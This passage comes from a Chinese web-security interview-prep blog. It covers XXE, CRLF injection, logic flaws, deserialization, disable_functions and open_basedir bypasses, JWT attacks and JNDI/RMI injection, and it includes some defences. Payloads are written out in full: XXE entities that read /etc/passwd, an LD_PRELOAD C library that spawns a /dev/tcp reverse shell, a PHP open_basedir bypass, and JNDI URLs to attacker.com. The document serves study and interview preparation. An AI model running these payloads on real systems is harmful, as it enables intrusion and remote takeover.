+<p><strong>大小写混淆</strong>：如 <code>System</code>、<code>SYSTEM</code>、<code>sYstEm</code> 等，部分过滤规则仅检测小写或大写。</p>
+</li>
+<li>
+<p><strong>编码绕过</strong>：对关键字进行 URL 编码（如 <code>%53%59%53%54%45%4D</code> 代表 <code>SYSTEM</code>）、HTML 实体编码（如 <code>&amp;SYSTEM</code>）。</p>
+</li>
+<li>
+<p><strong>使用参数实体</strong>：通过参数实体间接引用外部资源，如：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">  &lt;!ENTITY % xxe &quot;SYSTEM&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % file &quot;%xxe; &#x27;file:///etc/passwd&#x27;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY xxe2 %file;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>利用 XInclude</strong>：不依赖 <code>SYSTEM</code>/<code>PUBLIC</code>，直接用 XInclude 元素引用外部文件（如 <code>&lt;xi:include href=&quot;file:///etc/passwd&quot;/&gt;</code>）。</p>
+</li>
+<li>
+<p><strong>协议替换</strong>：使用其他协议（如 <code>file</code>、<code>ftp</code>、<code>gopher</code>），部分解析器支持非 HTTP 协议。</p>
+</li>
+</ul>
+<hr />
+<p>防御：防御 XXE 漏洞的核心是<strong>限制 XML 解析器对外部实体的处理</strong>，具体措施：</p>
+<ul>
+<li><strong>禁用外部实体</strong>：在解析器中配置禁用外部实体和参数实体。
+<ul>
+<li>Java：<code>DocumentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</code></li>
+<li>Python（lxml）：<code>lxml.etree.XMLParser(resolve_entities=False)</code></li>
+<li>PHP：<code>libxml_disable_entity_loader(true);</code></li>
+</ul>
+</li>
+<li><strong>过滤输入</strong>：严格验证用户提交的 XML 数据，拒绝包含 <code>DOCTYPE</code>、<code>ENTITY</code>、<code>SYSTEM</code>、<code>PUBLIC</code> 等关键字的内容。</li>
+<li><strong>使用安全解析器</strong>：选择默认禁用外部实体的 XML 解析库，避免使用老旧或配置宽松的解析器。</li>
+<li><strong>避免解析不可信 XML</strong>：尽量使用 JSON 等格式替代 XML 传输数据；若必须使用，仅解析可信来源的 XML。</li>
+<li><strong>处理文件上传</strong>：对上传的 Office 文件（如.docx），解析前先解压并清理其中的 XML 内容，移除恶意 DTD 和实体。</li>
+</ul>
+<h3 id="crlf了解吗-怎么绕过"><a class="markdownIt-Anchor" href="#crlf了解吗-怎么绕过"></a> crlf了解吗、怎么绕过？</h3>
+<p>cr 回⻋符</p>
+<p>lf 换⾏符</p>
+<p><strong>通过在用户输入中插入回车换行符(<code>\r\n</code>)，欺骗服务器将单行HTTP响应拆分成多行，从而注入恶意HTTP头部或分割响应体，实现XSS、会话固定、缓存污染等攻击</strong></p>
+<p>绕过： url 单双层编码</p>
+<p>将 <code>\r\n </code>转成 ascii 码</p>
+<p>更改 http 版本到 1.0 ，不发送 host 头，并将请求分⽚构造特殊请求</p>
+<h3 id="同源策略"><a class="markdownIt-Anchor" href="#同源策略"></a> 同源策略</h3>
+<p>同源指的是，同域名，同端口，同协议</p>
+<p>不同源之间的资源交互会被限制</p>
+<p>大致就是为了浏览器安全，防止服务端能够直接获取客户端的cookies，比如账号密码之类的提出来的策略</p>
+<h3 id="web中间件常见漏洞"><a class="markdownIt-Anchor" href="#web中间件常见漏洞"></a> web中间件常见漏洞</h3>
+<p>tomcat put写任意⽂件和远程代码执⾏</p>
+<p>log4j2远程代码执⾏</p>
+<p>nginx解析漏洞</p>
+<p>activeMQ反序列化</p>
+<p>fastjson反序列化</p>
+<p>jenkins远程命令执⾏</p>
+<h3 id="常的中间件解析漏洞有哪些"><a class="markdownIt-Anchor" href="#常的中间件解析漏洞有哪些"></a> 常⻅的中间件解析漏洞有哪些</h3>
+<p>解析漏洞是指web服务器因对http请求处理不当导致将⾮可执⾏的脚本，⽂件等当做可执⾏的脚本，⽂件等执⾏。</p>
+<p>该漏洞⼀般配合服务器的⽂件上传功能使⽤，以获取服务器的权限。</p>
+<p>漏洞：</p>
+<p>IIS 5.x/6.0解析漏洞</p>
+<p>IIS 7.0/IIS 7.5/nginx0.8.3解析漏洞</p>
+<p>Nginx &lt;0.8.03 空字节代码执⾏漏洞</p>
+<p>apache解析漏洞</p>
+<p><img src="../images/image-20260107150850688.png" alt="image-20260107150850688" /></p>
+<h3 id="常见的逻辑漏洞的类型"><a class="markdownIt-Anchor" href="#常见的逻辑漏洞的类型"></a> 常见的逻辑漏洞的类型</h3>
+<ol>
+<li>验证码爆破<br />
+​ 手机获取验证码的时候，系统没有对验证码的验证次数、有效时间进行限制，就会造成验证码爆破<br />
+​ 4位数验证码还是很快就可以爆破出来的，6位以上的就不怎么好爆破了</li>
+<li>验证码回显<br />
+​ 获取验证码的时候，返回的响应包里面直接返回了验证码<br />
+​ 可以完成任意用户登录，注册，密码找回</li>
+<li>验证码或密码绕过<br />
+​ 验证用户凭证的时候，会根据返回的状态码进行校验<br />
+​ 假设true代表成功，false代表失败。这里我们就可以通过抓取响应包，修改返回值，即可达到验证绕过</li>
+<li>短信轰炸<br />
+​ 没有对单个用户获取验证码的次数进行限制，通过Burp抓包，数据包重放就可以造成短信轰炸<br />
+​ 当收到短信达到20次还是30次（忘了）就可以提交漏洞了</li>
+<li>换绑手机<br />
+​ 后台没有对账号和绑定手机进行校验，我们可以通过抓包修改绑定的手机号码为我们的手机号</li>
+<li>越权<br />
+例如只要我登录了，我就可以查看别人的东西，因为对用户请求没有权限验证，只是判断是否登录<br />
+​ 水平越权：访问相同级别的用户的信息。如普通用户访问普通用户<br />
+​ 垂直越权：访问权限较大的用户的信息。如普通用户访问管理员<br />
+订单越权：通过修改URL的订单id值越权查看订单<br />
+收获地址越权：在收货地址的地方，查看或修改收货地址，通过修改address的id值即可查看或修改别人的收货地址</li>
+<li>支付类逻辑<br />
+商品价格修改。抓包修改购买商品的价格，即可造成0.01元购买商品<br />
+商品数量修改。抓包修改商品数量，可以改为-1<br />
+支付金额。提交订单购买的时候抓包修改价格</li>
+</ol>
+<h3 id="pickle反序列化原理绕过"><a class="markdownIt-Anchor" href="#pickle反序列化原理绕过"></a> pickle反序列化原理/绕过</h3>
+<p>pickle是Python的一个库,可以对一个对象进行序列化和反序列化操作.其中<code>__reduce__</code>魔法函数会在一个对象被反序列化时自动执行,我们可以通过在<code>__reduce__</code>魔法函数内植入恶意代码的方式进行任意命令执行.通常会利用到Python的反弹shell.</p>
+<p>绕过：</p>
+<p>**字节码过滤：**用其他的opcode码进行绕过</p>
+<p><strong>关键词过滤：</strong><code>V</code>操作符可以进行unicode编码、<code>S</code>操作符可以识别十六进制</p>
+<h3 id="php反序列化原理"><a class="markdownIt-Anchor" href="#php反序列化原理"></a> php反序列化原理</h3>
+<p>程序对不可信数据调用 <code>unserialize()</code>，在对象恢复过程中自动触发魔术方法，从而执行攻击者可控的逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct()触发时机：在实例化对象时</span><br><span class="line">__destruct()触发时机:对象引用完成或对象被销毁</span><br><span class="line">__sleep()触发时机：序列化serialize()之前</span><br><span class="line">__wakeup触发时机：反序列化unserialize()之前</span><br><span class="line">__toString()触发时机：把对象当成字符串调用</span><br><span class="line">__invoke()触发时机：把对象当成函数调用</span><br><span class="line">__call()触发时机：调用一个不存在的方法</span><br><span class="line">__callStatic()触发时机：静态调用或调用成员变量时使用的方法不存在</span><br><span class="line">__get()触发时机：调用的成员属性不存在</span><br><span class="line">__set()触发时机：给不存在的成员属性赋值</span><br><span class="line">__isset()触发时机：对不可访问或不存在的属性使用isset()或empty()时，__isset()会被调用</span><br><span class="line">__unset()触发时机：对不可访问属性使用unset()时</span><br><span class="line">__clone()触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</span><br></pre></td></tr></table></figure>
+<h3 id="说几个php里面可以执行命令的函数"><a class="markdownIt-Anchor" href="#说几个php里面可以执行命令的函数"></a> 说⼏个php⾥⾯可以执⾏命令的函数</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br></pre></td></tr></table></figure>
+<h3 id="php反序列化常用原生类"><a class="markdownIt-Anchor" href="#php反序列化常用原生类"></a> php反序列化常用原生类</h3>
+<p>扫目录：<code>DirectoryIterator</code>(支持glob://协议)，<code>FilesystemIterator</code>(继承自上一个)，<code>GlobIterator</code>（相等于自带glob协议的DirectoryIterator）<br />
+读取文件：<code>SplFileObject</code>（通过echo触发SplFileObject中的<code>__toString()</code>方法）<br />
+<code>Error/ Exception </code>类：用于绕过哈希比较、xss</p>
+<h3 id="thinkphp漏洞理解"><a class="markdownIt-Anchor" href="#thinkphp漏洞理解"></a> Thinkphp漏洞理解</h3>
+<ul>
+<li>thinkphp 2.x/3.x 远程代码执行 – preg_replace使用/e参数，可以直接执行php代码</li>
+<li>thinkphp 5.x 远程代码执行 – 多个反序列化调用危险函数，导致命令执行</li>
+<li>thinkphp 5.x sql注入 – 默认debug模式开启，错误的sql语句会暴露出数据库信息</li>
+<li>thinkphp 3.x 文件包含 – 文件包含日志getshell</li>
+</ul>
+<p>可以在github上下载thinkphp综合利用工具，直接检测所有可能的漏洞，直接利用</p>
+<h3 id="rce过滤特定字符例如flag该怎么办"><a class="markdownIt-Anchor" href="#rce过滤特定字符例如flag该怎么办"></a> rce过滤特定字符，例如flag该怎么办？</h3>
+<p>可以使⽤通配符，例如<code> fl*.php</code>  或者<code>base64 编码</code></p>
+<p>还可以使⽤变量拼接，例如 <code>$a=fl;$b=ag;$a$b</code></p>
+<h3 id="js原型链污染漏洞原理"><a class="markdownIt-Anchor" href="#js原型链污染漏洞原理"></a> JS原型链污染漏洞原理</h3>
+<p>攻击者通过修改对象原型（prototype），影响所有对象的属性解析，从而改变程序逻辑甚至导致代码执行。</p>
+<h3 id="jwt漏洞利用"><a class="markdownIt-Anchor" href="#jwt漏洞利用"></a> JWT漏洞利用</h3>
+<p>签名未校验攻击</p>
+<p><strong>None算法绕过签名</strong></p>
+<p>爆破密钥</p>
+<p>公钥私钥泄露</p>
+<p>密钥混淆攻击RS256=&gt;HS256：HS256算法使用密钥为所有消息进行签名和验证，而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。</p>
+<h3 id="ld_preload劫持"><a class="markdownIt-Anchor" href="#ld_preload劫持"></a> LD_PRELOAD劫持</h3>
+<p><strong>利用动态链接器在加载程序时优先加载指定共享库，可以在自己定义的动态链接库中装入恶意函数，从而替换系统函数，实现对程序行为的劫持。</strong></p>
+<p>利用前提：Linux系统，有文件上传和文件包含，有<code>mail</code> or <code>error_log</code>，能修改环境变量，例如<code>putenv</code></p>
+<p>步骤：</p>
+<p>通过执行php文件里面的内容就可以修改环境，但是要先有这个文件，还有需要注意的一点就是该文件是由权限访问的，所以就需要我们将它放置在tmp目录下最好</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/tmp/1222.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>.so文件的内容，就可以自己选择，通过上面的方法，但是还是推荐最后一个，因为它可以在任意命令执行前进行执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">      system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">&#125;   </span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="disable_functions绕过"><a class="markdownIt-Anchor" href="#disable_functions绕过"></a> disable_functions绕过</h3>
+<ul>
+<li><strong>常见方法</strong>：
+<ol>
+<li><strong>LD_PRELOAD 劫持</strong>（Linux）：上传自定义共享库（.so 文件），通过<code>putenv(&quot;LD_PRELOAD=/tmp/evil.so&quot;)</code>预加载，劫持<code>system</code>等函数实现命令执行。</li>
+<li><strong>PHP 扩展漏洞</strong>：利用<code>imap</code>、<code>gd</code>等扩展的漏洞（如<code>imap_open</code>的命令注入）绕过限制。</li>
+<li><strong>FFI 扩展</strong>：若启用<code>FFI</code>（Foreign Function Interface），可直接调用系统函数执行命令。</li>
+<li><strong>Windows COM 组件</strong>：在 Windows 系统中，通过<code>COM(&quot;WScript.Shell&quot;)</code>调用系统命令。</li>
+</ol>
+</li>
+<li><strong>成功率最高的是 LD_PRELOAD 劫持</strong>： 原因：兼容性强（适用于大多数 Linux 系统），无需依赖特定 PHP 扩展（仅需<code>putenv</code>和<code>mail</code>等未被禁用的函数），且实现逻辑简单（通过动态链接库劫持系统函数），对环境要求低，因此实际场景中成功率最高。</li>
+</ul>
+<h3 id="open_basedir绕过"><a class="markdownIt-Anchor" href="#open_basedir绕过"></a> open_basedir绕过</h3>
+<p>命令执行函数绕过：由于open_basedir的设置对system等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录。</p>
+<p>ini_set绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;s&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;s&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>
+<p>php-fpm绕过</p>
+<p>蚁剑插件绕过</p>
+<h3 id="session文件包含"><a class="markdownIt-Anchor" href="#session文件包含"></a> Session文件包含</h3>
+<p>若 Session 内容可控（如用户输入存入 Session），注入代码后包含 Session 文件（默认路径 <code>(/var/lib/php/sessions/sess_&lt;sessionid&gt;)</code>）即可执行恶意代码</p>
+<h3 id="文件包含防御"><a class="markdownIt-Anchor" href="#文件包含防御"></a> 文件包含防御</h3>
+<ol>
+<li>
+<p>设置包含文件白名单：强制限制包含路径，仅允许包含指定目录下的文件，例如<code>/var/www/include/</code>。</p>
+</li>
+<li>
+<p>路径过滤与校验</p>
+<ul>
+<li>禁止目录穿越：使用<code>realpath()</code>或<code>basename()</code>过滤参数，防止<code>../../</code>攻击。</li>
+<li>校验文件扩展名：确保包含文件为预期类型，如.php。</li>
+</ul>
+</li>
+<li>
+<p>设置 PHP 包含的文件目录：利用 open_basedir 安全机制，限制 PHP 只能访问特定目录。</p>
+</li>
+<li>
+<p>禁用危险配置：</p>
+ <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关闭远程包含:在php.ini中设置:</span><br><span class="line">ini</span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">Off</span></span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">Off</span> (非必需时关闭)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="跨域jsonp-与-cors-是什么"><a class="markdownIt-Anchor" href="#跨域jsonp-与-cors-是什么"></a> 跨域；Jsonp 与 Cors 是什么？</h3>
+<ul>
+<li><strong>跨域</strong>：浏览器的同源策略限制下，不同源的网页之间无法互相访问资源（如 AJAX 请求），“不同源” 指协议、域名、端口任意一项不同。</li>
+<li><strong>Jsonp（JSON with Padding）</strong>：跨域解决方案，<strong>利用<code>&lt;script&gt;</code>标签不受同源策略限制的特性，通过回调函数获取远程数据</strong>。流程：客户端定义回调函数，请求 URL 携带回调名（如<code>http://api.com/data?callback=func</code>），服务端返回<code>func(data)</code>，客户端脚本执行<code>func()</code>处理数据。</li>
+<li><strong>CORS（Cross-Origin Resource Sharing）</strong>：服务器端配置的跨域机制，通过响应头（如<code>Access-Control-Allow-Origin: https://example.com</code>）明确允许特定源访问资源，支持多种 HTTP 方法（如 POST、PUT），比 Jsonp 更规范、安全。</li>
+</ul>
+<h3 id="同源策略中的同源条件作用与限制"><a class="markdownIt-Anchor" href="#同源策略中的同源条件作用与限制"></a> 同源策略中的同源条件；作用与限制？</h3>
+<p><strong>同源条件：</strong></p>
+<p>需同时满足<strong>协议相同</strong>（如均为<code>http</code>或<code>https</code>）、<strong>域名相同</strong>（如均为<code>example.com</code>，<code>a.example.com</code>与<code>b.example.com</code>不同源）、<strong>端口相同</strong>（如均为 80 或 443）。</p>
+<p><strong>作用：</strong></p>
+<p>防止恶意网站通过脚本窃取用户数据（如 Cookie、LocalStorage）或操作 DOM，是浏览器的核心安全机制。</p>
+<p><strong>限制：</strong></p>
+<ul>
+<li>不能读取不同源网页的 Cookie、LocalStorage、SessionStorage。</li>
+<li>不能访问不同源网页的 DOM（如<code>iframe</code>中的内容）。</li>
+<li>不能发送跨域 AJAX/ Fetch 请求（或需服务器允许，如 CORS）。</li>
+<li>不能调用<code>window.open()</code>打开的不同源窗口的<code>window</code>对象属性。</li>
+</ul>
+<h2 id="javasec"><a class="markdownIt-Anchor" href="#javasec"></a> Javasec</h2>
+<p>大部分来自<a target="_blank" rel="noopener" href="https://hilang.cloud/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9D%A2%E8%AF%95%E9%A2%98/">反序列化漏洞面经</a></p>
+<h3 id="java反射原理"><a class="markdownIt-Anchor" href="#java反射原理"></a> java反射原理</h3>
+<p>在程序运行时，动态地获取类的内部信息，并能够操作类的属性、方法和构造函数，即使这些成员是私有的</p>
+<h3 id="java的双亲委派机制"><a class="markdownIt-Anchor" href="#java的双亲委派机制"></a> java的双亲委派机制</h3>
+<p>当一个类加载器收到类加载请求时，它首先不会自己尝试加载，而是将这个请求委派给父类加载器去完成。每一层的类加载器都是如此，只有当父加载器无法完成加载时，子加载器才会尝试自己加载。</p>
+<h3 id="java类的动态加载"><a class="markdownIt-Anchor" href="#java类的动态加载"></a> java类的动态加载</h3>
+<p>在程序运行时（而非编译时或启动时），根据需求动态地加载类到JVM中并创建实例。</p>
+<h3 id="jdk高版本限制绕过"><a class="markdownIt-Anchor" href="#jdk高版本限制绕过"></a> JDK高版本限制&amp;绕过</h3>
+<p><strong>jdk8及以前</strong></p>
+<p>这个版本下的jdk对反射是没有一点限制的，我们平时做java的反序列化大多都在这个版本(指jdk8)，我们各种java的poc都可以流畅地编写</p>
+<p><strong>jdk9-jdk16</strong></p>
+<p>从jdk9开始，当我们用反射去获取<code>java.*</code>包下的非public变量和方法的时候会报警告，但是还是能够正常地反射调用的。</p>
+<p><strong>jdk17+</strong></p>
+<p>在jdk17+下java启动了强封装机制，<code>java.*</code>下的非<code>public</code>字段和方法都无法通过反射进行获取调用</p>
+<p><strong>绕过反射限制：</strong></p>
+<p>在<code>jdk17</code>下，<code>sun.misc</code>和<code>sun.reflect</code>包下的内容是可以正常反射调用的，因此我们可以使用<code>sun.misc.Unsafe</code>来进行绕过。通过<code>Unsafe</code>类里的<code>getAndSetObject</code>方法来修改调用类的<code>module</code></p>
+<h3 id="解决jackson链的不稳定性"><a class="markdownIt-Anchor" href="#解决jackson链的不稳定性"></a> 解决jackson链的不稳定性</h3>
+<p>通过 <code>JdkDynamicAopProxy</code> 对 <code>TemplatesImpl</code> 进行动态代理，并限定仅代理 <code>Templates</code> 接口，从而使 Jackson 在解析该代理对象时只能找到唯一的 <code>getOutputProperties</code> 方法，确保 100% 稳定触发恶意类加载</p>
+<h3 id="jndi注入绕过高版本jdk"><a class="markdownIt-Anchor" href="#jndi注入绕过高版本jdk"></a> JNDI注入绕过高版本JDK</h3>
+<p>高版本JDK默认禁止从远程加载远程代码类</p>
+<p>1、<strong>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</strong></p>
+<p>如Tomcat的BeanFactory，然后用ELProcessor类(或GroovyShell类)作为目标类执行命令</p>
+<p>2、<strong>如果目标服务端有漏洞依赖(如CC依赖)，可以利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行</strong></p>
+<h3 id="java命令执行方式"><a class="markdownIt-Anchor" href="#java命令执行方式"></a> java命令执行方式</h3>
+<p>java.lang.Runtime</p>
+<p>java.lang.ProcessBuilder</p>
+<p>java.lang.ProcessImpl</p>
+<p>javax.script.ScriptEngineManager</p>
+<h3 id="绕过传统反射黑名单"><a class="markdownIt-Anchor" href="#绕过传统反射黑名单"></a> 绕过传统反射黑名单</h3>
+<p>如果传统反射被加入了黑名单可以怎么绕：</p>
+<p><code>Invoke:</code></p>
+<p><strong>Method.invoke</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Threedr3am.class.getMethod(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">method.invoke(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>MethodAccessor.invoke</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Threedr3am.class.getMethod(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="type">ReflectionFactory</span> <span class="variable">reflectionFactory</span> <span class="operator">=</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">sun</span>.reflect.ReflectionFactory.GetReflectionFactoryAction());</span><br><span class="line"><span class="type">MethodAccessor</span> <span class="variable">methodAccessor</span> <span class="operator">=</span> reflectionFactory.newMethodAccessor(method);</span><br><span class="line">methodAccessor.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>JSClassLoader.invoke</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Main.class.getDeclaredMethod(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">JSClassLoader.invoke(method, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+<p><code>newInstance:</code></p>
+<p><strong>JSClassLoader.newInstance</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Main.class.getConstructor();</span><br><span class="line">JSClassLoader.newInstance(constructor, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="jndi注入原理"><a class="markdownIt-Anchor" href="#jndi注入原理"></a> JNDI注入原理</h3>
+<p>当目标应用的 JNDI <strong>查询参数（如查找的名称）可控</strong>（例如用户输入直接作为<code>lookup()</code>方法的参数）时，攻击者可<strong>构造恶意的命名服务 URL</strong>（如<code>jndi:rmi://attacker.com/evil</code>或<code>jndi:ldap://attacker.com/evil</code>）。 应用执行<code>lookup()</code>时，会按照 URL <strong>连接攻击者控制的远程服务（RMI/LDAP 服务器）</strong>，并从该服务获取 “资源引用”（如指向恶意类的路径）。<strong>应用会自动从指定路径下载恶意类并加载执行</strong>，若类中包含恶意代码（如<code>static</code>代码块中的命令执行逻辑），则触发远程代码执行（RCE）。</p>
+<h3 id="rmi工作流程"><a class="markdownIt-Anchor" href="#rmi工作流程"></a> RMI工作流程</h3>
+<p>RMI（Remote Method Invocation，远程方法调用）是 Java 实现跨进程通信的机制，核心是允许一个 JVM 中的对象调用另一个 JVM 中对象的方法，工作流程如下：</p>
+<ol>
+<li><strong>服务端注册</strong>：远程对象（实现了远程接口的类）通过<code>LocateRegistry.createRegistry()</code>在本地注册中心（默认端口 1099）注册，暴露服务名称和接口。</li>
+<li><strong>客户端查找</strong>：客户端通过<code>Naming.lookup()</code>或 JNDI 的<code>InitialContext.lookup()</code>向注册中心查询远程对象的引用。</li>
+<li><strong>建立连接</strong>：客户端获取远程对象的引用后，底层通过 TCP 建立与服务端的网络连接。</li>
+<li><strong>远程调用</strong>：客户端调用远程对象的方法时，参数通过序列化传输到服务端；服务端执行方法后，将结果反序列化并返回给客户端。</li>
+</ol>
+<h3 id="rmi-jndi-的原理是什么"><a class="markdownIt-Anchor" href="#rmi-jndi-的原理是什么"></a> RMI-JNDI 的原理是什么？</h3>
+<p>RMI-JNDI 是指通过 JNDI 接口访问 RMI 服务的机制，允许客户端通过 JNDI 的<code>lookup()</code>方法查找 RMI 注册中心的远程对象，原理如下：</p>
+<ul>
+<li><strong>服务端可在 RMI 注册中心绑定一个<code>Reference</code>对象</strong>（包含目标类的名称、代码基地 URL 等信息），而非直接绑定远程对象。</li>
+<li>客户端通过 JNDI 的<code>lookup(&quot;rmi://server/name&quot;)</code><strong>查询该<code>Reference</code><strong>时，会根据其中的代码基地 URL <strong>下载对应的类文件</strong>（<code>.class</code>），并在本地</strong>实例化该类</strong>。</li>
+<li>若下载的类中包含恶意代码（如<code>static</code>代码块中的命令执行），则客户端在实例化时会自动执行，导致 RCE。</li>
+</ul>
+<h3 id="rmi-jndi-注入流程大概说一下含原理"><a class="markdownIt-Anchor" href="#rmi-jndi-注入流程大概说一下含原理"></a> RMI-JNDI 注入流程大概说一下？（含原理）</h3>
+<p>流程及原理如下：</p>
+<ol>
+<li><strong>攻击者准备</strong>：<strong>搭建恶意 RMI 服务器</strong>，<strong>注册一个<code>Reference</code>对象</strong>，其中<code>className</code>设为自定义恶意类名（如<code>Evil</code>），<code>codebase</code>设为攻击者控制的 HTTP 服务器地址（存放<code>Evil.class</code>）。</li>
+<li><strong>注入恶意 URL</strong>：攻击者通过目标应用的输入点（如用户可控的参数），将恶意 JNDI URL（<code>jndi:rmi://attacker.com/evil</code>）注入到应用的 JNDI 查找逻辑中。</li>
+<li><strong>应用触发查询</strong>：目标应用执行<code>lookup()</code>时，<strong>解析 URL 并连接攻击者的 RMI 服务器，获取<code>Reference</code>对象</strong>。</li>
+<li><strong>加载恶意类</strong>：应用根据<code>Reference</code>中的<code>codebase</code>从 HTTP 服务器下载<code>Evil.class</code>，并通过反射实例化该类。</li>
+<li><strong>执行恶意代码</strong>：<code>Evil.class</code>的<code>static</code>代码块（如<code>Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/attacker/port 0&gt;&amp;1&quot;)</code>）在类加载时自动执行，实现 RCE。</li>
+</ol>
